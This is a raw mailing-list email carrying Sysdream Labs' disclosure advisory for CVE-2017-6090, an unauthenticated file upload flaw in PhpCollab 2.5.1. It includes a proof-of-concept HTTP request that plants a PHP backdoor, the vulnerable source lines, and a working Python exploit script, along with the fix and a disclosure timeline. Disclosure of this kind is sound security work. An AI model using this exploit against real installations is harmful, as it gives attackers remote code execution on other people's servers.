X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5302" "Friday" "29" "September" "2017" "16:31:40" "+0200" "Sysdream Labs" "labs@sysdream.com" "<f608373d-34ce-2e55-a04f-965305be5ea9@sysdream.com>" "180" "[oss-security] [CVE-2017-6090] PhpCollab 2.5.1 Arbitrary File Upload (unauthenticated)" "^Cc:" nil nil "9" "2017092914:31:40" "[oss-security] [CVE-2017-6090] PhpCollab 2.5.1 Arbitrary File Upload (unauthenticated)" (number mark "U       labs@sysdrea Sep 29  180/5302  " thread-indent "\"[oss-security] [CVE-2017-6090] PhpCollab 2.5.1 Arbitrary File Upload (unauthenticated)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 14335 invoked by uid 550); 29 Sep 2017 14:31:56 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 14273 invoked from network); 29 Sep 2017 14:31:56 -0000
DKIM-Filter: OpenDKIM Filter v2.9.2 mail.sysdream.com F1FB61A0D5C
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sysdream.com;
	s=FEF1D5FC-BC6A-11E6-98AA-27E162F08D53; t=1506695502;
	bh=gIGbGqfUetV+v/9Cy5Svf7nTT5iHRvqJw/e8RKDzXdc=;
	h=To:From:Subject:Message-ID:Date:MIME-Version:Content-Type;
	b=Ly9YmJVs9pbDPV4+qNda44JbylS3zUY8P1CxWeTqxigrAQfAHbGl8OtdrVg2HzUxj
	 sVrMXO1fyM+MgUu0i2t9AS61VNipcZJwVYv9cAXUV/d2qfC850ievMyyCufJQOlBO1
	 fVSqhogXQ568uGYHCNcA+dE5fWiqs2H/dmCKL3bI=
X-Virus-Scanned: amavisd-new at sysdream.com
Message-ID: <f608373d-34ce-2e55-a04f-965305be5ea9@sysdream.com>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.2.1
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
 protocol="application/pgp-signature";
 boundary="AHLXpA53R9wJkcESmIHsQH1eW5sEBKGVH"
Cc: oss-security@lists.openwall.com
Date: Fri, 29 Sep 2017 16:31:40 +0200
From: Sysdream Labs <labs@sysdream.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] [CVE-2017-6090] PhpCollab 2.5.1 Arbitrary File Upload
 (unauthenticated)
To: fulldisclosure@seclists.org

--AHLXpA53R9wJkcESmIHsQH1eW5sEBKGVH
Content-Type: multipart/mixed; boundary="KOvHxhSkT3PxIa3fwVKes0Mp8jLuJIAuP";
 protected-headers="v1"
From: Sysdream Labs <labs@sysdream.com>
To: fulldisclosure@seclists.org
Cc: oss-security@lists.openwall.com
Message-ID: <f608373d-34ce-2e55-a04f-965305be5ea9@sysdream.com>
Subject: [CVE-2017-6090] PhpCollab 2.5.1 Arbitrary File Upload
 (unauthenticated)

--KOvHxhSkT3PxIa3fwVKes0Mp8jLuJIAuP
Content-Type: text/plain; charset=utf-8
Content-Language: en-US
Content-Transfer-Encoding: quoted-printable

# [CVE-2017-6090] PhpCollab 2.5.1 Arbitrary File Upload (unauthenticated)

## Description

PhpCollab is an open source web-based project management system, that enabl=
es collaboration across the Internet.

## Arbitrary File Upload

The phpCollab code does not correctly filter uploaded file contents. An una=
uthenticated attacker may upload and execute arbitrary code.

**CVE ID**: CVE-2017-6090

**Access Vector**: remote

**Security Risk**: Critical

**Vulnerability**: CWE-434

**CVSS Base Score**: 10 (Critical)

**CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

### Proof of Concept

The following HTTP request allows an attacker to upload a malicious php fil=
e, without authentication.
Thus, a file named after `$id.extension` is created.

For example, a backdoor file can be reached at `http://phpCollab.lan/logos_=
clients/1.php`.

```
POST /clients/editclient.php?id=3D1&action=3Dupdate HTTP/1.1
Host: phpCollab.lan
Accept: text/html,application/xhtml+xml,application/xml;q=3D0.9,*/*;q=3D0.8
Accept-Language: fr,fr-FR;q=3D0.8,en-US;q=3D0.5,en;q=3D0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=3D---------------------------15=
4934846911423734231554128137
Content-Length: 252

-----------------------------154934846911423734231554128137
Content-Disposition: form-data; name=3D"upload"; filename=3D"backdoor.php"
Content-Type: application/x-php

<?php phpinfo(); ?>

-----------------------------154934846911423734231554128137--
```


### Vulnerable code

The vulnerable code is found in `clients/editclient.php`, line 63.

```
$extension =3D strtolower( substr( strrchr($_FILES['upload']['name'], ".") =
,1) );
if(@move_uploaded_file($_FILES['upload']['tmp_name'], "../logos_clients/".$=
id.".$extension"))
{
  chmod("../logos_clients/".$id.".$extension",0666);
  $tmpquery =3D "UPDATE ".$tableCollab["organizations"]." SET extension_log=
o=3D'$extension' WHERE id=3D'$id'";
  connectSql("$tmpquery");
}
```


### Exploit code

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import requests

if __name__ =3D=3D '__main__':
    if (len(sys.argv) !=3D 4):
        print("Enter your target, userid and path for file upload like : py=
thon exploit.py http://www.phpCollabURL.lan 1 /tmp/test.php")
        sys.exit(1)

    target =3D "%s/clients/editclient.php?id=3D%s&action=3Dupdate" % (sys.a=
rgv[1], sys.argv[2])
    print("[*] Trying to exploit with URL : %s..." % target)
    backdoor =3D {'upload': open(sys.argv[3], 'rb')}
    r =3D requests.post(target, files=3Dbackdoor)
    extension =3D os.path.splitext(sys.argv[3])[1]
    link =3D "%s/logos_clients/%s%s" % (sys.argv[1], sys.argv[2], extension=
 )
    r =3D requests.get(link)
    if r.status_code =3D=3D 200:
        print("[OK] Backdoor link : %s" % link)
    else:
        print("[FAIL]Problem (status:%s) (link:%s)" % (r.status_code, link))
```

## Solution

Update to the latest version avalaible.

## Affected versions

* Version <=3D 2.5.1

## Timeline (dd/mm/yyyy)

* 27/08/2016 : Initial discovery.
* 05/10/2016 : Initial contact.
* 11/10/2016 : GPG Key exchange.
* 19/10/2016 : Advisory sent to vendor.
* 13/02/2017 : First fixes.
* 15/02/2017 : Fixes validation by Sysdream.
* 21/02/2017 : PhpCollab ask to wait before publish.
* 21/06/2017 : New version has been released.
* 29/09/2017 : Public disclosure.

## Credits

* Nicolas SERRA, Sysdream  (n.serra -at- sysdream -dot- com)

--=20
SYSDREAM Labs <labs@sysdream.com>

GPG :
47D1 E124 C43E F992 2A2E
1551 8EB4 8CD9 D5B2 59A1

* Website: https://sysdream.com/
* Twitter: @sysdream


--KOvHxhSkT3PxIa3fwVKes0Mp8jLuJIAuP--

--AHLXpA53R9wJkcESmIHsQH1eW5sEBKGVH
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEER9HhJMQ++ZIqLhVRjrSM2dWyWaEFAlnOWUwACgkQjrSM2dWy
WaEJlA/7ByETDWiArtGu4ZnxvXHewFteut/+45R984368wn3p6HGlgfRZtZnHGfX
4awvi+P9Geh9N+DX7sIfpkasWQ+2CoXBdOG1L37FiVEoxCFEeP4OvP0npHPbMZsw
FiZPog4+rbTRs5KN/ipbVoiHqttJysVhvvGf1CqkhkedM2yY1boUiZ0EbWPf+ghi
1n3zQDo2tEaOjfxTvy4SWi3XjwumFT1mBDvL2yXM2KBMQNayoxYtxQnfn+Gj7io7
xYnuvfPQE9uI0JSJ8qnptNYQ93bHHvY0oSTOlVGkVOvdMYzaSvPDolU4+ZpRgi86
gjzXEJn2ShuanRbUx2KQV4r4zOFZqc52VL5lHlrE/m2GbUxDeWI5p584I6KDQQIE
wHQaXBYDh91Kgce5hVyU3XO4+5DyyQ4NvH4/zioWD0vZdnbsM1QmcP+fu44uhcqI
Z5b21cgsetxhshvFPkww0Zl8aN6BatBGQGxhmOHE1gCwXkT0D+Nb1NBJFFP1OLpj
WE9ipURuxLhpMNkjTQbPY0g+2n0V7d4+CDSrhlVgonAdX4uDbfC2idgrZUvm61Op
9IPEceActDGGQJn2rdBCcoMZANAf0TdRQaTGjSNVN46dGz4gerllugKt+BzbIDeI
g4HZTEjQ8LU4hbt6lqyZEO29UlxOCqznDYwEQDEHSYfy01xmq6Q=
=Masr
-----END PGP SIGNATURE-----

--AHLXpA53R9wJkcESmIHsQH1eW5sEBKGVH--
